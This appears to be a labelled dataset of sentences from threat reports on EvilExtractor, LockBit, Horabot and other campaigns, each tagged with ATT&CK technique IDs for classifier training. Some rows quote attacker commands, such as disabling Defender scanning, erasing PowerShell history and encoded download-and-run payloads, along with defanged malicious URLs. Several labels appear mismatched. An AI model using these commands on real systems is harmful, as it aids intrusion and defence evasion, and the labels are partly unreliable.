"If not, it uses the following command to delete the data in PSReadline and terminate: DEL \""$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\*\"" -Force –Recurse It then compares the product model to see if it matches any of the following: VirtualBox, VMWare, Hyper-V, Parallels, Oracle VM VirtualBox, Citrix Hypervisor, QEMU, KVM, Proxmox VE, or Docker, as shown in Figure 6.",T1070.004
"It also checks the victim’s hostname against 187 names from VirusTotal machines or other scanner/virtual machines, as shown in Figure 7. Figure 6.",T1082
"Virtual environment and scanner/virtual machine checking After passing the environment check, EvilExtractor downloads three components from http://193[.]42[.]33[.]232 used for stealing data.",T1105
These files are also Python programs that are obfuscated using PyArmor.,T1027
It also collects browser history and passwords from the following browsers: The second file is “Confirm.zip”.,T1552.001
It is a key logger that saves data in the “KeyLogs” folder.,T1056.001
"Download components for the Keylogger and Webcam Snapshot functions EvilExtractor also collects system information by PowerShell script, shown in Figure 9.",T1056.001
It also uses the command “CopyFromScreen” to capture a screenshot.,T1113
"Downloading files and getting a screenshot After EvilExtractor extracts all the data from the compromised endpoint, it uploads it to the attacker’s FTP server, shown in Figure 12.",T1113
"The threat actors also expressed interest in other access methods such as RDP, VPN and corporate email credentials.",T1021.001
"LockBit 2.0 Tactics, Techniques and Procedures Technically speaking, we have observed LockBit 2.0 affiliates leveraging the following tactics, techniques and procedures: TA0001 Initial Access T1078 Valid Accounts Credentials that have either been reused across multiple platforms or have previously been exposed.",T1078
"Additionally, this includes VPN accounts – not just domain and local accounts.",T1078
External Remote Services Affiliates have been seen brute forcing exposed RDP services and compromising accounts with weak passwords.,"T1210, T1110"
T1190 Exploit Public-Facing Applications Vulnerabilities such as ProxyShell (CVE-2021-34473) and improper SQL sanitization (CVE-2021-20028),T1190
LockBit 2.0 can be executed via scheduled tasks.,T1053.005
Command and Scripting Interpreter LockBit 2.0 is typically executed via command line arguments via a hidden window.,T1059.003
"It was quite common to see scheduled tasks used to create persistence for the ransomware executable, PsExec, and occasionally some defense evasion batch scripts.","T1059.003, T1053.005"
Valid Accounts Compromised accounts may be used to maintain access to the network.,T1078
"TA0004 Privilege Escalation T1068 Exploitation for Privilege Escalation The ProxyShell elevation of privilege on the Exchange PowerShell Backend (CVE-2021-34523), Windows Background Intelligent Transfer Service (BITS) improperly handling symbolic links (CVE-2020-0787), and abusing the CMSTPLUA COM interface have all been seen as methods of privilege escalation.",T1068
T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control LockBit 2.0 has utilized a UAC bypass tool.,T1548.002
"TA0005 Defense Evasion T1070 Indicator Removal on Host Indicators, such as logs in Windows Event Logs or malicious files, are typically removed using wevtutil, a batch script, or CCleaner.",T1027
T1140 Deobfuscate/Decode Files or Information Most PowerShell scripts involved in LockBit 2.0 cases are Base64 encoded.,T1027
Group Policy Modification LockBit 2.0 has been seen using the PowerShell module InvokeGPUpdate to update the group policy.,T1484.001
"Impair Defenses: Disable or Modify Tools Windows Defender, other anti-malware solutions and monitoring tools are disabled utilizing a process explorer tool, a batch script or a specially crafted command line script.","T1562.001, T1059.003"
"TA0006 Credential Access T1003 OS Credential Dumping As seen with other ransomware cases, Mimikatz is a key player in dumping credentials but LockBit 2.0 has been occasionally seen utilizing MiniDump as well.",T1003.001
"T1082 System Information Discovery LockBit 2.0 enumerates system information such as hostname, shares, and domain information.",T1082
"Remote Services Although Cobalt Strike has many capabilities beneficial to threat actors in ransomware attacks, it was mainly seen in LockBit 2.0 investigations acting as a command and control beacon, a method of lateral movement and a tool for downloading/executing files.",T1570
T1021.002 Remote Services: SMB/Windows Admin Shares LockBit 2.0 has been known to self-propagate via SMB.,T1570
"Remote Access Software AnyDesk has been the most common legitimate desktop software used to establish an interactive command and control channel, with ConnectWise seen slightly less frequently.",T1219
"T1489 Service Stop During the defense evasion phase, anti-malware and monitoring software is often disabled.",T1562.001
Firewall rules have occasionally been seen being disabled as well.,T1562.001
StealBit contains the following capabilities: Operates as a file grabber and dumps/uploads victim data to the LockBit victim-shaming site.,T1105
title: SOC Team Essentials | How to Investigate and Track the 8220 Gang Cloud Threat url: https://www.sentinelone.com/blog/soc-team-essentials-how-to-investigate-and-track-the-8220-gang-cloud-threat/ 8220 Gang is a low-skill crimeware actor known for infecting cloud hosts through n-day vulnerabilities and remote access brute forcing.,T1110
Attacks make use of SSH brute forcing post-infection to automate local and global spreading attempts.,T1110
The script in question has the SHA1 a9da0947243333d95f84f6a0e37b9fc29b2fb054. 8220 Infection Script Snippet We can see it is quite simple in design and built around the process of downloading and setting persistence of some other file.,T1105
"Remember, this “infection script” is used by many attackers, and it alone is a very weak source of attribution. 8220 Infection Script Analysis The script goes through a set of instructions, often at multiple levels of encoded commands, aimed at the delivery of setting persistence on the victim machine by downloading itself from malicious servers.","T1027, T1105"
The multiple levels of Base64 encoding attempt to hide the fact that it is also downloading a specific payload as well.,"T1027, T1105"
Infection Script createservices Function One difference that’s quickly apparent to past reporting on the script is that the attacker began adding the lwp-download command as a failover for wget and curl to enable downloading commands.,T1105
"For example, in our infection scripts createservices makes use of three base64 encoded echo commands.",T1027
The first command can be decoded into a new script which pings associated attacker infrastructure and then starts a “payload” command. Infection Script’s encoded payload,"T1027, T1140"
"The payload contains two additional base64 encoded scripts to set permissions, download, and configure miner and IRC bot infections.","T1027, T1105"
"In this campaign, the script downloads the UPX packed sample 38be55f1fc4ce1cb5438236abc5077019e5e1cdf, which unpacks to 332485bd460f55117a254f8164736b90d74aa9f6.",T1027
"Agrius exploits known vulnerabilities in internet-facing applications to install webshells, then conducts internal reconnaissance before moving laterally and then deploying its malicious payloads.",T1190
"Preparing for departure The first tools deployed by Agrius operators to victim systems, through means unknown, were: MiniDump, “a C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps” SecretsDump, a Python script that “performs various techniques to dump hashes from [a] remote machine without executing any agent there” Host2IP, a custom C#/.NET tool that resolves a hostname to an IP address.","T1003.001, T1033"
"Usernames, passwords, and hostnames collected by these tools are required for Sandals to successfully spread and execute the Fantasy wiper.","T1033, T1082"
"It is used to connect to systems in the same network via SMB, to write a batch file to disk that executes the Fantasy wiper, and then run that batch file via PsExec with this command line string:","T1570, T1059.003"
"Additionally, we believe the victims were already using PsExec, and Agrius operators chose to use PsExec to blend into typical administrative activity on the victims’ machines, and for ease of batch file execution.",T1059.003
Table 1 lists the command line arguments accepted by Sandals.,T1059.003
The location to which Sandals will write the batch file on the remote system.,T1059.003
"The amount of time, in seconds, that Sandals will sleep between writing the batch file to disk and executing.",T1059.003
"If flag=True, Sandals deletes all files written to disk in the current working directory.",T1070.004
"No The batch file written to disk by Sandals is named <GUID>.bat, where the filename is the output of the Guid.",T1059.003
"Sandals batch file (top, in red) and the decoded command line parameter (bottom, in blue)","T1027, T1140"
The base64 string that follows fantasy35.exe is likely a relic of the execution requirements of Apostle (more details in the Attribution to Agrius section).,T1027
It collects a list of fixed drives but excludes the drive where the %WINDOWS% directory exists.,T1083
"Then it enters a for loop iterating over the drive list to build a recursive directory listing, and uses the RNGCryptoServiceProvider.",T1083
Fantasy then assigns a specific timestamp (2037-01-01 00:00:00) to these file timestamp properties: CreationTime LastAccessTime LastWriteTime CreationTimeUtc SetLastAccessTimeUtc LastWriteTimeUtc and then deletes the file.,T1070.004
"If the number of errors exceeds 50, it writes a batch file, %WINDOWS%\Temp\<GUID>.bat, that deletes the directory with the files causing the errors, and then self-deletes.","T1027, T1059.003, T1070.004"
"Once the for loop completes, the Fantasy wiper creates a batch file in %WINDOWS%\Temp called registry.bat.","T1059.003, T1112"
The batch file deletes the following registry keys: HKCR\.EXE HKCR\.dll HKCR\* Then it runs the following to attempt to clear file system cache memory:,"T1059.003, T1218.011, T1112"
"%windir%\system32\rundll32.exe advapi32.dll,ProcessIdleTasks Lastly, registry.bat deletes itself (del %0).","T1027, T1218.011"
"Next, the Fantasy wiper clears all Windows event logs and creates another batch file, system.bat, in %WINDOWS%\Temp, that recursively deletes all files on %SYSTEMDRIVE%, attempts to clear file system cache memory, and self-deletes.","T1027, T1059.003, T1070.004"
"Fantasy then writes another batch file, %WINDOWS%\Temp\remover.bat, that deletes the Fantasy wiper from disk and then deletes itself.","T1027, T1059.003"
"Figure 4 shows the file deletion functions in Fantasy and Apostle, respectively.",T1070.004
"File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) Figure 4.",T1070.004
"File deletion functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green) Figure 5 shows that the directory listing function is almost a direct copy, with only the function variables getting a slight tweak between Apostle and Fantasy.","T1083, T1070.004"
"Directory listing functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green)",T1083
"Finally, the GetSubDirectoryFileListRecursive function in Figure 6 is also almost an exact copy.","T1083, T1106"
"Recursive directory listing functions from the Fantasy wiper (top, in red) and Apostle ransomware (bottom, in green)",T1083
"In the original analysis of Apostle, SentinelOne notes that “Proper execution of the ransomware version requires supplying it with a base64 encoded argument containing an XML of an ‘RSAParameters’ object.",T1027
"We can see in the batch file in Figure 7, which Sandals creates on remote systems to launch Fantasy, that the same base64-encoded argument containing an XML of an RSAParameters object is passed to Fantasy at runtime.","T1027, T1059.003"
Initial AccessT1078.002Valid Accounts: Domain AccountsAgrius operators attempted to capture cached credentials and then use them for lateral movement. T1078.003Valid Accounts: Local AccountsAgrius operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network.,T1078
Windows Command ShellFantasy and Sandals both use batch files that run via the Windows command shell. Privilege EscalationT1134Access Token ManipulationFantasy uses the LookupPrivilegeValue and AdjustTokenPrivilege APIs in advapi32.dll to grant its process token the SeShutdownPrivilege to reboot Windows.,"T1106, T1059.003"
T1570Lateral Tool TransferAgrius operators used Sandals to push batch files over SMB to other systems within an internal network.,T1570
ImpactT1485Data DestructionThe Fantasy wiper overwrites data in files and then deletes the files.,T1070.004
"Specifically, CISA observed HTTPS activity from IP address to the organization’s VMware server.",T1071.001
"Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address.",T1071.001
"The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies.",T1078
"Threat Actor Activity In February 2022, the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organization’s unpatched VMware Horizon server.",T1190
The actors’ exploit payload ran the following PowerShell command [T1059.001] that added an exclusion rule to,T1562.001
Windows Defender,T1562.001
"[T1562.001]: powershell try{Add-MpPreference -ExclusionPath 'C:\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc ""$BASE64 encoded payload to download next stage and execute it"" The exclusion rule allowlisted the entire , enabling threat actors to download tools to the without virus scans.","T1027, T1562.001, T1105"
"When executed, mde.ps1 downloaded from and removed from the disk [T1070.004]. contained XMRig cryptocurrency mining software and associated configuration files.",T1027
The exploit payload created a Scheduled Task,T1053.005
"By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.",T1078
The Scheduled Task was named to masquerade as a legitimate Windows task.,T1053.005
"After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account","T1021.001, T1078"
[T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.,T1078
The actors downloaded the following tools: PsExec – a Microsoft signed tool for system administrators.,T1003.001
Mimikatz – a credential theft tool.,T1003.001
"Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at .",T1090
Ngrok is known to be used for malicious purposes.[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account,T1003.001
"Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.",T1021.001
"Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.",T1562.001
"The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to and (the prior domain in reverse).","T1090, T1021.001, T1071.001"
"Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process [T1003.001] with task manager but this was stopped by additional anti-virus the FCEB organization had installed. MITRE ATT&CK TACTICS AND TECHNIQUES See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations.",T1003.001
Table 1: Cyber Threat Actors ATT&CK Techniques for Enterprise Initial Access Technique Title ID Use Recommendations Exploit Public-Facing Application T1190 The actors exploited Log4Shell for initial access to the organization’s VMware Horizon server.,T1190
Domain Account T1136.002,T1003.001
The actors used Mimikatz to create a rogue domain administrator account.,T1003.001
[DS0002]. Scheduled Task/Job: Scheduled Task T1053.005,T1053.005
"The actors’ exploit payload created Scheduled Task RuntimeBrokerService.exe, which executed RuntimeBroker.exe daily as SYSTEM.",T1053.005
[DS0003]. Valid Accounts: Default Accounts T1078.001,T1078
The actors used built-in Windows user account DefaultAccount.,T1078
Develop rules to monitor logon behavior across default accounts that have been activated or logged into [DS0028]. Defense Evasion Technique Title ID Use Recommendations Impair Defenses: Disable or Modify Tools T1562.001,T1562.001
The actors added an exclusion rule to Windows Defender.,T1562.001
"The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\drive.",T1562.001
The actors manually disabled Windows Defender via the GUI.,T1562.001
Indicator Removal on Host: File Deletion T1070.004,T1027
The actors removed malicious file mde.ps1 from the dis. Detection:,T1027
Credential Access Technique Title ID Use Recommendations OS Credential Dumping: LSASS Memory T1003.001,T1003.001
The actors were observed trying to dump LSASS process.,T1003.001
[DS0017]. Credentials from Password Stores T1555 The actors used Mimikatz to harvest credentials.,T1003.001
Remote Desktop Protocol T1021.001 The actors used RDP to move laterally to multiple hosts on the network.,T1021.001
"Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP [DS0028]. Command and Control Technique Title ID Use Recommendations Proxy T1090 The actors used Ngrok to proxy RDP connections and to perform command and control.","T1090, T1021.001"
[DS0029]. Ingress Tool Transfer T1105,T1105
"The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok.",T1105
"Horabot enables the threat actor to control the victim’s Outlook mailbox, exfiltrate contacts’ email addresses, and send phishing emails with malicious HTML attachments to all addresses in the victim’s mailbox.",T1566.001
"The banking trojan can collect the victim’s login credentials for various online accounts, operating system information and keystrokes.","T1566.001, T1056.001, T1078, T1082"
"However, the attacker uses Horabot and the spam tool in this campaign to further propagate the attack by sending additional phishing emails to the victim’s contacts, meaning Spanish-speaking users from organizations in additional verticals are likely also affected.",T1566.001
"Attacker infrastructure dates back to Nov. 2020Talos discovered that the attacker in this campaign is using multiple hosts, including an Amazon Web Services (AWS) Elastic Compute Cloud (EC2) instance, accessed through its public URL, to host the malicious files.",T1071.001
"During our analysis, Talos observed that a malicious server at IP address 185[.]45[.]195[.]226 hosted the PowerShell downloader script and had an open directory that the attacker eventually disabled.",T1105
"Another malicious server, 216[.]238[.]70[.]224, hosted the ZIP file containing the payloads.",T1105
"This is most likely a virtual private server (VPS) behind which the attacker has parked the actual command and control (C2) server, leaving us unable to identify the actual C2.",T1090
"This domain name also resembled the legitimate Mexican Tax Agency domain, a tactic the attacker likely adopted to disguise malicious traffic.",T1036.005
2022wiqp[.]xyzAugust 2022ckws[.]infoJanuary 2023amarte[.]store March 2023Multi-stage attack chain uses PowerShell downloader and DLL sideloadingThis campaign involves a multi-stage attack chain that begins with a phishing email and leads to payload delivery through the execution of a PowerShell downloader script and sideloading to legitimate executables.,"T1574.002, T1566.001, T1059.003"
"The infection starts with an income tax-themed phishing email written in Spanish, disguising itself as a tax receipt notification and enticing users to open the attached malicious HTML file.","T1566.001, T1204.002"
"When a victim opens the HTML file attachment, an embedded URL is launched in the victim’s browser, redirecting to another malicious HTML file from an attacker-controlled AWS EC2 instance.","T1090, T1027"
The content displayed on the victim’s browser lures them to click an embedded malicious hyperlink which downloads a RAR file.,"T1105, T1204.002"
Disguised malicious web page.,T1105
The RAR file contains a batch file with a CMD extension that is executed when the victim opens the contents of the file.,"T1059.003, T1204.002"
The batch file downloads the PowerShell downloader script from an attacker-controlled server and executes it through the PowerShell commands.,"T1105, T1059.003"
The PowerShell downloader script will download a ZIP file that contains the payload DLLs and a few legitimate executables and DLLs.,"T1105, T1055"
It creates Windows shortcut files configured to run the payloads in the startup folder of the victim’s machine and restarts the machine after 10 seconds.,T1547.001
"After the victim’s machine is rebooted, the malicious Windows startup files run the payloads by sideloading them to the legitimate executables and downloading and executing two other PowerShell scripts from a different attacker-controlled server.","T1574.002, T1105, T1059.003"
"One is the PowerShell downloader script, which the attacker attempts to execute to re-infect the victim’s machine, and another is Horabot.",T1059.003
Three-layer infection chain delivers and detonates the payloadsMalicious batch file downloads the PowerShell downloaderThe RAR file containing a malicious batch file with a .cmd extension is downloaded to the user’s machine.,T1059.003
"Per the instructions on the HTML page, if the user opens the CMD file, the malicious batch script executes an embedded PowerShell command to download the next-stage PowerShell script from the server and execute it on the victim’s machine.","T1059.003, T1204.002"
PowerShell script downloads the payloadsThe malicious PowerShell downloader script launches several processes that download the payloads and reboots the victim’s machine.,"T1105, T1543.003"
The script is heavily obfuscated with random symbols that substitute the instructions during the run-time and base64-encoded strings.,T1027
"In the initial stage of the execution, the script decodes the base64-encoded strings and initializes them.",T1140
It executes a function that uses alphanumeric characters and the special character “_” to generate a random name and creates a folder with the random name in the root directory of the victim’s machine.,T1027
The script creates two other malicious batch scripts with the extension .cmd,T1059.003
in the folder “/Users/Public.”,T1059.003
Then it creates two Windows shortcut files in the Windows startup folder using the Internet Explorer application icon and the target paths pointing to the two dropped batch scripts.,T1547.001
"The script also creates three more Windows shortcut files in the victim’s machine startup folder, with the details of the target path pointing to the folders where the payloads are eventually downloaded.",T1547.001
"\Public\DESKTOP-UT9NJ4S.cmd Next, the script downloads a malicious ZIP file — “m.zip” — from a server using the URL “hxxp[://]216[.]238[.]70[.]224/20/t/e/m.zip” to the random name folder.",T1105
"The deflated contents are renamed using random characters, then the malicious ZIP file is deleted.",T1070.004
"The script also writes the path of the executable file, “_upyqta2_Ji7.exe”, to the class’s registry key “HKEY_CURRENT_USER\software\Classes\ms-settings\shell\open\command” and restarts the victim’s machine after 10 seconds using the command “shutdown /r /t",T1112
"script_upyqta2_J.exeAutoIt interpreter_upyqta2_J.iaEncrypted trojan DLL_upyqta2_J.mdatEncrypted Spam tool DLL_upyqta2_Ji7.exeKinit.exe, a legitimate executablejli.dllBanking trojan MSVCR100.dllLegitimate DLLWebView2Loader.dllLegitimate DLLMalicious shortcut files detonate the payloads after system restartAfter the PowerShell downloader reboots the victim’s machine, the malicious Windows shortcut files dropped in the Windows startup folder are run, executing the payloads used in the attack.",T1547.001
"This section describes the behavior of each of the shortcut files._upyqta2_JAA.lnkThis link file “_upyqta2_JAA.lnk” will sideload a malicious DLL called “jli.dll,” a banking trojan, by executing “_upyqta2_Ji7.exe,” which is actually a legitimate copy of “kinit.exe” that the PowerShell downloader script drops._upyqta2_JEX.lnkThis link file executes the compiled AutoIt","T1574.002, T1027"
"script “_upyqta2_J.ai” by running the executable “ _upyqta2_J.exe”, which is a legitimate AutoIt interpreter.","T1027, T1036.005"
The AutoIt script decrypts the encrypted “_upyqta2_J.ia” and drops the DLL “_upyqta2_J.ia.a1” with a spoofed file extension that has a hardcoded malicious function “A040822_1”.,"T1105, T1140"
"Then, the AutoIt script will sideload the DLL “_upyqta2_J.ia.a1” to the AutoIt interpreter process and execute the malicious function “A040822_1” with the parameter “STRUCT.”",T1574.002
"The decrypted malicious DLL “_upyqta2_J.ia.a1” is another copy of the banking trojan with additional stealer capabilities such as keylogging, copying of clipboard data, screenshot capturing and mouse tracking.","T1113, T1056.001"
A snippet of the AutoIt code _Upyqta2_J.ai_upyqta2_JAT.lnkThis link file performs the same steps as “_upyqta2_JEX.lnk” by executing the AutoIt script “_upyqta2_J.at” to decrypt “ _upyqta2_J.mdat” and create the DLL “_upyqta2_J.mdat.a1” with a spoofed extension.,T1140
"Then, the AutoIt script sideloads the DLL to the AutoIt interpreter process and executes the malicious function “B080223_AT” with the parameter “STRUCT”.",T1574.002
"This link file executes one of the dropped batch files, “<desktop-name>S.cmd.”",T1059.003
The batch file executes an embedded PowerShell command to download the PowerShell downloader script from the attacker-controlled server using the URL hxxp[://]tributaria[.]website/esp/12/151222/up/up” and executes it.,"T1105, T1059.003"
"link file executes another dropped batch file, “<desktop_name>Sy.cmd”, which executes a PowerShell command to download and run the Horabot “au” using the URL hxxp[://]tributaria[.]website/esp/12/151222/au/au.","T1105, T1059.003"
"PayloadsTalos found that the payloads employed by the attacker in this campaign are designed to steal sensitive information, evade detection and disseminate additional phishing emails to the victim’s contacts.","T1027, T1566.001"
"The banking trojan targets the victim’s sensitive information, such as login credentials and financial transaction security codes, and logs keystrokes and manipulates the victim machine’s clipboard data.","T1078, T1056.001"
"Banking trojan targets victim’s login credentials and financial informationThe banking trojan identified in this campaign, a 32-bit Windows DLL written in the Delphi programming language and packed with Themida packer, can collect system information, credentials and user activity.","T1078, T1082"
"The trojan performs surveillance on the victim’s machine by collecting system information such as hostnames, IPv4 address, operating system version, disk volume information, disk size and anti-virus software information, and gets the system’s default language.","T1518.001, T1082"
The reconnaissance data is exfiltrated to the attacker-controlled server through an HTTP POST request to the URL in the below format.hxxp[://]216[.]238[.]70[.]224/20/a/20/index[.]php?AT=<username>%20<hostname>%20<Operating system version>&MD=<Antivirus,T1041
"The trojan has remote desktop management capabilities such as creating and deleting directories on the victim’s machine, checking if a file on the victim’s filesystem exists and gets the file’s attributes, collecting size and version information, and downloading files from a URL.","T1105, T1083"
"It also has information-stealing capabilities, such as logging keystrokes via polling and application hooks, capturing screenshots, manipulating the victim’s machine clipboard and tracking the mouse's events.","T1113, T1056.001"
"Talos spotted hardcoded SQL commands in the trojan binary designed to collect login data from the Google Chrome user profile folders by writing it to a database source file called “login_data.sql”, and creating SQL queries to produce the database tables to store the stolen data.","T1005, T1074.001"
"Creates processes enabling the debug privileges by adjusting the process token “Debug,” readings the Process Environment Block, and queries the DebugPort to check if the malware is being debugged.",T1518.001
"Checks for the existence of the anti-virus products such as AVG and Avast by checking for the DLLs avghookx.dll, avghooka.dll and snxhk.dll.",T1518.001
Detects the sandbox environments such as SunBelt and Joe sandboxes.,T1012
"Checks the registry keys to detect virtual environments such as VMWare, Virtual Box, Wine, Microsoft Hyper-V or Windows Virtual PC.A spam tool acts as another payload in this campaign, enabling the attacker to take over the victim’s other email accounts and send spam emails to the contacts found within them.",T1012
"The spam tool is a 32-bit DLL written in Delphi and, when run on the victim’s machine, will attempt to compromise the victim’s login credentials for webmail services such as Yahoo, Gmail, and Hotmail.",T1078
The tool also exfiltrates the email address to the C2 server using an HTTP POST request.,T1041
"The spam tool also showed us information-stealing capabilities such as logging keystrokes, capturing screenshots and tracking or intercepting the mouse events on the victim’s machine.","T1113, T1056.001"
The decryption function decrypts the URL pointing to the attacker-controlled server.,T1140
"It has embedded Visual Basic code that enables the threat actor to control the victim’s Outlook mailbox, exfiltrate contacts’ email addresses, and send phishing emails with malicious HTML attachments to all addresses in the victim’s mailbox.","T1041, T1566.001"
"After initialization, the script looks for the Outlook data files from the victim profile’s Outlook application data folder.",T1083
"It enumerates all folders and emails in the victim’s Outlook data file and extracts email addresses from the emails’ sender, recipients, CC and BCC fields.","T1083, T1005"
"After they are successfully validated, the addresses are added to the email address collection array.",T1074.001
"Next, the script writes the extracted email addresses from the array to a file called “.Outlook” created by the script in the roaming user profile’s",T1074.001
Microsoft application data folder.,T1074.001
Then the script encodes the email addresses in the “.Outlook” file to a data stream.,"T1027, T1074.001"
"Using the GetRequestStream function, the script requests a data stream from the C2 server through the URL hxxp[://]139[.]177[.]193[.]74/esp/12/151222/au/tst/index[.]php?list and upon the successful response, the encoded email addresses are exfiltrated.","T1041, T1071.001"
Then the script downloads the contents of an HTML file stored in an attacker-controlled server and writes it to the HTML file dropped in the “fb” folder.,T1105
The HTML file has an embedded malicious URL “hxxps[://]facturacionmarzo[.]cloud/e/archivos[.]pdf[.]html” in its metadata section.,T1027
"Next, the script constructs an email with a hardcoded subject and body and attaches the HTML file from the “fb” folder.",T1566.001
"Then the phishing email is sent to the list of extracted email addresses one at a time, deleting the “fb” folder to cover its paths and avoid detection.",T1070.004
"Executive SummaryAnother threat actor is actively exploiting the so-called PrintNightmare vulnerability (CVE-2021-1675 / CVE-2021-34527) in Windows' print spooler service to spread laterally across a victim's network as part of a recent ransomware attack, according to Cisco Talos Incident Response research.",T1210
Some of the most interesting characteristics of this attack were:The use of utilities such as proxychains and impacket during the post-compromise phases of the attack lifecycle.,T1090
Below are some examples of the command line syntax used for the performance of this activity.cmd.exe /q,T1059.003
"Windows Command Shell (T1059.003)ATT&CK Technique: Command and Scripting Interpreter: PowerShell (T1059.001)ATT&CK Technique: Windows Management Instrumentation (T1047)ATT&CK Technique: System Services: Service Execution (T1569.002)Similar to what was observed during the post-compromise reconnaissance phase of the attack, the adversary used impacket to execute Windows Management Instrumentation (WMI) to achieve command execution on other systems present in the environment.",T1047
"The attacker also used the ""proxychains"" utility, which is often employed to redirect network traffic during penetration testing, red teaming, and other offensive operations.",T1090
[USERNAME]@[IP ADDRESS] 1> \\127.0.0.1\admin$\__[STRING] 2>&1We also observed the adversary using Windows Batch files to execute PSExec.,T1059.003
cmd /c,T1059.003
"In this particular case, we observed the adversary leveraging a Windows Service to execute PowerShell to stay persistent in the environment.",T1569.002
The Windows service was configured with the following options:Service Type: user mode service Service Start Type: demand start Service Account:,T1543.003
"[BASE64 ENCODED BLOB]As can be seen above, the PowerShell being executed was Base64 encoded.",T1027
The decoded PowerShell instructions are below:This PowerShell is responsible for the performing the following tasks:Disabling PowerShell logging.,"T1562.001, T1140"
Bypassing AMSI protection for PowerShell.,T1105
"Downloading, decrypting, and executing a backdoor payload from an attacker-controlled server.","T1105, T1140"
"During the investigation, we observed the attacker leveraging Windows Remote Desktop Connections to pivot to additional systems in the environment.",T1021.001
This was typically performed via the following command-line syntax:C:\Windows\system32\mstsc.exe /v,T1059.003
[HOSTNAME]The attacker also attempted to execute PowerShell scripts on remote systems in the environment while moving system-to-system.,T1570
"Bypass -file \[IPADDRESS]\share$\p.ps1 During the attack, adversaries copied and executed the aforementioned PowerShell script on multiple systems across the environment.",T1570
Technique: OS Credential Dumping (T1003)ATT&CK Technique: OS Credential Dumping: LSASS Memory (T1003.001)The actor attempted to extract credentials from the victim in two ways: Accessing the active directory global catalog file ntds.dit and utilizing comsvcs.dll. Comsvcs.dll is a well-known way to extract LSASS (Local Security Authority Subsystem Service) data.,T1003.001
"By invoking comsvcs.dll with rundll32.exe, an adversary can create a dump of any process.","T1003.001, T1218.011"
Examples of the command-line syntax used in these cases are below.cmd.exe /q /c,T1059.003
"The following command-line syntax was observed being used to clear the System, Security and Application Windows Event Logs.",T1059.003
applicationThe adversary was also observed remotely modifying the Windows Registry on remote systems to disable remote administration restrictions to facilitate lateral movement and privilege escalation activities.,"T1562.001, T1112"
Disabling this security control allows attackers to leverage pass-the-hash attacks and hinder RDP's security on systems.cmd.exe /q /c,T1562.001
We also observed the attacker disabling Windows Defender by modifying the Windows Registry on compromised systems.,"T1562.001, T1112"
"In this case, the Windows Command Processor was used to invoke PowerShell, which then leveraged Invoke-Expression (IEX) for this purpose.cmd.exe /Q /c powershell.exe -exec bypass -noni -nop",T1059.003
"In this attack, we observed the adversary attempting to exfiltrate sensitive information over SMB (TCP/445) directly from a compromised domain controller.",T1041
These intrusions exploited the Microsoft SharePoint vulnerability CVE-2019-0604 to install web shells and FOCUSFJORD payloads at targets in the Middle East and Central Asia.,T1190
"Attack Lifecycle Between 2019 and 2020, Mandiant responded to several incidents where Microsoft SharePoint vulnerability CVE-2019-0604 was used to deliver web shells, and then FOCUSFJORD payloads to select government and academic targets in the Middle East and Central Asia.",T1190
"This includes running native Windows commands on compromised servers, executing ADFind on the Active Directory, and scanning the internal network with numerous publicly available tools and a non-public scanner we named WHEATSCAN.",T1059.003
The operators made a consistent effort to delete these tools and remove any residual forensic artifacts from compromised systems.,T1027
"After identifying key systems within the target network, such as domain controllers and Exchange servers, UNC215 moved laterally and deployed their signature malware FOCUSFJORD.",T1570
"UNC215 often uses FOCUSFJORD for the initial stages of an intrusion, and then later deploys HYPERBRO, which has more information collection capabilities such as screen capture and keylogging.","T1113, T1056.001"
Reducing Forensic Evidence on Disk UNC215 consistently cleaned up evidence of their intrusion after gaining access to a system.,T1027
This type of action can make it more difficult for incident responders to reconstruct what happened during a compromise.,T1070.004
The operators deleted tools used for credential harvesting and internal reconnaissance including a custom scanner dubbed WHEATSCAN after use.,T1070.004
"On initial execution, FOCUSFJORD writes its encrypted C2 configuration into the system’s registry, sets up a persistence mechanism and then rewrites itself on disk without the embedded configuration and with limited functionality to only read configuration data.",T1112
"The tool can be deployed and executed remotely to delete any remaining FOCUSFJORD forensic evidence, including files on disk, configuration data encrypted in the registry, and related services and registry keys used for persistence.",T1070.004
"As illustrated in Figure 2, the operators were able to access their primary target via RDP connections from a trusted third party using stolen credentials and used this access to deploy and remotely execute FOCUSFJORD on their primary target.","T1570, T1021.001, T1078"
"Figure 2: Two FOCUSFJORD samples configured to proxy C2 traffic Concealing C2 Infrastructure UNC215 made technical modifications to their tools to limit outbound network traffic and used other victim networks to proxy their C2 instructions, likely to minimize the risk of detection and blend in with normal network traffic.",T1090
The following are examples of HYPERBRO and FOCUSFJORD samples capable of acting as proxies to relay communications to their C2 servers.,T1090
Figure 3: Two FOCUSFJORD samples configured to proxy C2 traffic FOCUSFJORD Changes We have observed numerous variants of the FOCUSFJORD malware family since 2017.,T1090
